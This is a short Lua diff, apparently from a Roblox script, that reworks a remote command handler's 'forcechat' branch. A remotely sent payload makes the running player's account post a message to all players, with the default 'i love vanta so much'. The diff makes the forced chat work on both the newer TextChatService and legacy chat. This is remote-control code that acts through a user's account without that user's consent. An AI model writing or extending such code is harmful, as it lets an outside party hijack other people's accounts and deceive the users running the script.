@@ -3898,14 +3898,23 @@ local function _handleRemoteCommand(payload)
     elseif cmd == "forcechat" then
         pcall(function()
             local msg = tostring(payload.message or "i love vanta so much")
-            local chatEvent = game:GetService("ReplicatedStorage")
-                :FindFirstChild("DefaultChatSystemChatEvents")
-            if chatEvent then
-                local sayMsg = chatEvent:FindFirstChild("SayMessageRequest")
-                if sayMsg then
-                    sayMsg:FireServer(msg, "All")
-                end
-            end
+            -- Method 1: New TextChatService (most Roblox games 2022+)
+            local ok1 = pcall(function()
+                local tcs  = game:GetService("TextChatService")
+                local chan  = tcs.TextChannels:FindFirstChild("RBXGeneral")
+                          or tcs.TextChannels:FindFirstChildWhichIsA("TextChannel")
+                if chan then chan:SendAsync(msg) end
+            end)
+            if ok1 then return end
+            -- Method 2: Legacy Roblox chat
+            pcall(function()
+                local sayMsg = game:GetService("ReplicatedStorage")
+                    :FindFirstChild("DefaultChatSystemChatEvents")
+                    and game:GetService("ReplicatedStorage")
+                        .DefaultChatSystemChatEvents
+                        :FindFirstChild("SayMessageRequest")
+                if sayMsg then sayMsg:FireServer(msg, "All") end
+            end)
         end)
     end
 end
